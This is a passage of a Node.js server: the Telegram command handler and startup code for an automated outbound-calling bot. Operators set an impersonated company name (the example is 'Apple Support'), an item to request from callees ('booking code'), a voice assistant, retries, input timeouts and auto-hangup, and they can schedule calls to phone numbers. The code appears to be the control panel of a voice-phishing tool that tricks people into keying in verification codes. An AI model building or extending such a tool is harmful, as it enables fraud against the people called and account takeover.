          saveSettings();
          await tgSend(`🎙 ${assistant().name} assistant set`);
          markPanelDirty();
          await updatePanel(false, role);
        } else {
          await tgSend("Use /assistant 1 to 6");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/company")) {
        const name = text.replace("/company", "").trim();
        if (!name) {
          await tgSend("Usage: /company Apple Support");
        } else {
          settings.company = name;
          saveSettings();
          await tgSend(`🏢 Company set to ${settings.company}`);
          markPanelDirty();
          await updatePanel(false, role);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/item")) {
        const name = text.replace("/item", "").trim();
        if (!name) {
          await tgSend("Usage: /item booking code");
        } else {
          settings.itemName = name;
          saveSettings();
          await tgSend(`📝 Item set to ${settings.itemName}`);
          markPanelDirty();
          await updatePanel(false, role);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/maxretries")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 1 && n <= 10) {
          settings.maxRetries = n;
          saveSettings();
          await tgSend(`🔁 Max retries set to ${n}`);
          markPanelDirty();
          await updatePanel(false, role);
        } else {
          await tgSend("Usage: /maxretries 3");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/timeout")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 3 && n <= 30) {
          settings.inputTimeout = n;
          saveSettings();
          await tgSend(`⏱ Input timeout set to ${n}s`);
          markPanelDirty();
          await updatePanel(false, role);
        } else {
          await tgSend("Usage: /timeout 8");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/autoconfirm")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 0 && n <= 600) {
          settings.autoConfirmSec = n;
          saveSettings();
          await tgSend(`✅ Auto confirm set to ${n}s`);
          markPanelDirty();
          await updatePanel(false, role);
        } else {
          await tgSend("Usage: /autoconfirm 0");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/autohangup")) {
        const n = parseInt(text.split(" ")[1], 10);
        if (n >= 0 && n <= 600) {
          settings.autoHangupSec = n;
          saveSettings();
          await tgSend(`⛔ Auto hangup set to ${n}s`);
          markPanelDirty();
          await updatePanel(false, role);
        } else {
          await tgSend("Usage: /autohangup 0");
        }
        return res.sendStatus(200);
      }

      if (text === "/pause") {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        settings.paused = true;
        saveSettings();
        await tgSend("⏸ Calling paused");
        markPanelDirty();
        await updatePanel(false, role);
        return res.sendStatus(200);
      }

      if (text === "/resume") {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        settings.paused = false;
        saveSettings();
        await tgSend("▶ Calling resumed");
        markPanelDirty();
        await updatePanel(false, role);
        return res.sendStatus(200);
      }

      if (text === "/stop") {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        const active = sortedCalls().filter(c => c.status !== "Ended");
        for (const c of active) {
          try {
            await endLiveCallImmediately(c.sid);
            c.status = "Ended";
            c.endedAt = Date.now();
            removeCallTimers(c);
          } catch {}
        }

        settings.paused = true;
        saveSettings();
        await tgSend("🛑 All calls stopped and calling paused");
        markPanelDirty();
        await updatePanel(false, role);
        return res.sendStatus(200);
      }

      if (text === "/quickdials") {
        let out = "📇 Quick Dials\n\n";
        Object.entries(quickDialTargets).forEach(([label, number]) => {
          out += `${label}: ${number || "not set"}\n`;
        });
        await tgSend(out);
        return res.sendStatus(200);
      }

      if (text.startsWith("/schedule")) {
        const parts = text.split(" ").filter(Boolean);
        const number = parts[1];
        const delayRaw = parts[2];

        if (!number || !delayRaw) {
          await tgSend("Usage: /schedule +447xxxxxxxx 10m");
        } else {
          const delayMs = parseDelay(delayRaw);
          if (!delayMs) {
            await tgSend("Use delay like 30s, 10m, 1h");
          } else {
            scheduleOutboundCall(number, delayMs);
            await tgSend(`⏰ Scheduled ${number} in ${delayRaw}`);
          }
        }

        return res.sendStatus(200);
      }

      if (text === "/listadmins") {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        const out = (db.admins || []).length
          ? "👥 Admins\n\n" + db.admins.join("\n")
          : "No admins";
        await tgSend(out);
        return res.sendStatus(200);
      }

      if (text.startsWith("/addadmin")) {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        const id = text.split(" ")[1];
        if (!id) {
          await tgSend("Usage: /addadmin 123456789");
          return res.sendStatus(200);
        }
        if (!db.admins.includes(String(id))) {
          db.admins.push(String(id));
          saveDB();
        }
        await tgSend(`✅ Admin added: ${id}`);
        return res.sendStatus(200);
      }

      if (text.startsWith("/removeadmin")) {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        const id = text.split(" ")[1];
        if (!id) {
          await tgSend("Usage: /removeadmin 123456789");
          return res.sendStatus(200);
        }
        db.admins = db.admins.filter(x => String(x) !== String(id));
        saveDB();
        await tgSend(`🗑 Admin removed: ${id}`);
        return res.sendStatus(200);
      }
    }
  } catch (e) {
    console.log("/telegram error:", e.message);
  }

  res.sendStatus(200);
});

// ============================================================
// LIVE PANEL LOOP
// ============================================================

setInterval(() => {
  if (panelDirty && panelMessageId) {
    panelDirty = false;
    updatePanel(false, "owner");
  }
  cleanupEndedCalls();
}, 300);

// ============================================================
// STARTUP
// ============================================================

app.listen(PORT, async () => {
  console.log("Server started");
  console.log("Server booted and ready");

  try {
    await new Promise(r => setTimeout(r, 3000));
    await updatePanel(true, "owner");
    console.log("Telegram panel created");
  } catch (e) {
    console.log("Panel creation error:", e.message);
  }
});
